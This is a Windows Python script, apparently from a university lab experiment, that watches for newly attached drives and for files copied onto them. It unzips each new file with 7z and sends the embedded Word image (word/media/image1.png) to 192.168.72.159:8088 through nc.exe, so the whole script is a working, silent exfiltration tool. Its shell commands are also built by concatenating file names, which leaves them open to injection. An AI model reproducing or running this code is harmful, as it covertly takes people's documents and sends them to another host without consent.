# encoding: utf-8
#C:\Users\Wave\AppData\Local\Programs\Python\Python36-32\Lib\site-packages\win32\test

import os
from subprocess import check_output
#import subprocess
import re
import json
import time
import sys

def monitorCopy(diskname):
	cmd = 'dir /b ' + diskname + '\\'
	baselineFiles = check_output(cmd, shell=True).decode(sys.stdout.encoding).strip().split()

	while True:
		time.sleep(1)
		try:
			monitorFiles = check_output(cmd, shell=True).decode(sys.stdout.encoding).strip().split()
			if len(baselineFiles) < len(monitorFiles):
				print(list(set(monitorFiles) - set(baselineFiles)))
				copiedFilename = list(set(monitorFiles) - set(baselineFiles))[0]
				unzipcmd = '7z.exe x ' + diskname + '\\' + copiedFilename + ' -oC:\\Workspace\\NTUST\\isLab\\exp2\\temp\\'
				check_output(unzipcmd, shell=True).decode(sys.stdout.encoding)
				print ('unzip')
				cmdnc = 'nc.exe 192.168.72.159 8088 < C:\\Workspace\\NTUST\\isLab\\exp2\\temp\\word\\media\\image1.png'
				check_output(cmdnc, shell=True).decode(sys.stdout.encoding)
				print('Transmit')
				baselineFiles = check_output(cmd, shell=True).decode(sys.stdout.encoding).strip().split()
			else:
				print('Not Docu Transmit in')
		except:
			break
		
		
def main():
	baseline = str(check_output("wmic  logicaldisk get name", shell=True).decode()).strip().split()
	
	while True:
		time.sleep(1)
		monitor = str(check_output("wmic  logicaldisk get name", shell=True).decode()).strip().split()
		if len(baseline) != len(monitor):
			print ('Disk changed')
			monitorCopy(monitor[-1])
		else:
			print ('Disk not changed')
				
if __name__ == '__main__':
    main()
